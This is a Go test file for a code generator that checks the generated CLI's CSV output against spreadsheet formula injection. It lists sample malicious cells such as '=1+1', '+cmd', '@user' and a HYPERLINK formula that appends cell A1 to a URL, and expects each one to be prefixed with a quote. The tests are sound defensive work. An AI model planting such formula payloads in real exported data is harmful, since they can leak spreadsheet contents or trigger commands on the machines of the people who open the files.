package generator

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestPrintCSVNeutralizesFormulaInjection(t *testing.T) {
	t.Parallel()

	apiSpec := minimalSpec("csv-injection")
	outputDir := filepath.Join(t.TempDir(), "csv-injection-pp-cli")
	require.NoError(t, New(apiSpec, outputDir).Generate())

	skill := readGeneratedFile(t, outputDir, "SKILL.md")
	require.Contains(t, skill, "Redirects are not followed")
	require.Contains(t, skill, "private 0600")
	require.Contains(t, skill, "plain signed number such as `-5` or `+2.5e3`")
	readme := readGeneratedFile(t, outputDir, "README.md")
	require.Contains(t, readme, "Plain signed numbers such as `-5` and `+2.5e3` are left unchanged.")

	testPath := filepath.Join(outputDir, "internal", "cli", "print_csv_injection_test.go")
	require.NoError(t, os.WriteFile(testPath, []byte(`package cli

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"strings"
	"testing"
)

func TestPrintCSVNeutralizesFormulaLedCells(t *testing.T) {
	payload, err := json.Marshal([]map[string]any{{
		"name": "=1+1",
		"note": "+cmd",
		"ok":   "host-1",
	}})
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := printCSV(&buf, payload); err != nil {
		t.Fatal(err)
	}
	want := "name,note,ok\n'=1+1,'+cmd,host-1\n"
	if got := buf.String(); got != want {
		t.Fatalf("got %q\nwant %q", got, want)
	}
}

func TestPrintCSVKeepsSignedDecimalsAndPrefixesExpressions(t *testing.T) {
	payload, err := json.Marshal([]map[string]any{{
		"expr": "-1+1",
		"n":    -5,
		"pop":  -3483757,
		"sci":  "+2.5e3",
		"tiny": -0.00001,
	}})
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := printCSV(&buf, payload); err != nil {
		t.Fatal(err)
	}
	want := "expr,n,pop,sci,tiny\n'-1+1,-5,-3483757,+2.5e3,-0.00001\n"
	if got := buf.String(); got != want {
		t.Fatalf("got %q\nwant %q", got, want)
	}
}

func TestPrintCSVNeutralizesFormulaHeaderKey(t *testing.T) {
	payload, err := json.Marshal([]map[string]any{{
		"=evil": "x",
		"ok":    "host-1",
	}})
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	if err := printCSV(&buf, payload); err != nil {
		t.Fatal(err)
	}
	want := "'=evil,ok\nx,host-1\n"
	if got := buf.String(); got != want {
		t.Fatalf("got %q\nwant %q", got, want)
	}
}

func TestPrintCSVNeutralizesEmptyDeclaredHeader(t *testing.T) {
	var buf bytes.Buffer
	fields := map[string]bool{"=evil": true, "name": true, "-5": true}
	if err := printCSV(&buf, json.RawMessage("[]"), fields); err != nil {
		t.Fatal(err)
	}
	want := "-5,'=evil,name\n"
	if got := buf.String(); got != want {
		t.Fatalf("got %q\nwant %q", got, want)
	}
}

func TestWriteCSVRowNeutralizesFormulaCellsAndKeepsQuoting(t *testing.T) {
	cells := []string{
		"=HYPERLINK(\"http://example.com/?\"&A1,\"x\")",
		"-5",
		"+2.5e3",
		"+2.5e+3",
		"+2.5E-03",
		"-.5",
		"+5.",
		"-1+1",
		"-Inf",
		"+Inf",
		"-NaN",
		"-0x10",
		"+0x1p1",
		"+cmd",
		"@user",
		"--5",
		"-5 ",
		"+2.5e",
		"a,b",
		"'=x",
		"\tcmd",
		"\r=1",
		"\n=1",
		"＝1+1",
		"＋cmd",
		"－1+1",
		"＠user",
		"host-1",
		"10.1.2.3",
		"hello =1",
		"",
	}
	want := []string{
		"'=HYPERLINK(\"http://example.com/?\"&A1,\"x\")",
		"-5",
		"+2.5e3",
		"+2.5e+3",
		"+2.5E-03",
		"-.5",
		"+5.",
		"'-1+1",
		"'-Inf",
		"'+Inf",
		"'-NaN",
		"'-0x10",
		"'+0x1p1",
		"'+cmd",
		"'@user",
		"'--5",
		"'-5 ",
		"'+2.5e",
		"a,b",
		"''=x",
		"'\tcmd",
		"'\r=1",
		"'\n=1",
		"'＝1+1",
		"'＋cmd",
		"'－1+1",
		"'＠user",
		"host-1",
		"10.1.2.3",
		"hello =1",
		"",
	}
	var buf bytes.Buffer
	writeCSVRow(&buf, cells)
	records, err := csv.NewReader(strings.NewReader(buf.String())).ReadAll()
	if err != nil {
		t.Fatalf("csv: %v\n%s", err, buf.String())
	}
	if len(records) != 1 {
		t.Fatalf("records = %#v", records)
	}
	if len(records[0]) != len(want) {
		t.Fatalf("cells = %#v", records[0])
	}
	for i := range want {
		if records[0][i] != want[i] {
			t.Fatalf("cell %d = %q, want %q", i, records[0][i], want[i])
		}
	}
}
`), 0o644))

	runGoCommand(t, outputDir, "test", "./internal/cli", "-run", "TestPrintCSVNeutralizesFormulaLedCells|TestPrintCSVKeepsSignedDecimalsAndPrefixesExpressions|TestPrintCSVNeutralizesFormulaHeaderKey|TestPrintCSVNeutralizesEmptyDeclaredHeader|TestWriteCSVRowNeutralizesFormulaCellsAndKeepsQuoting", "-count=1")
}
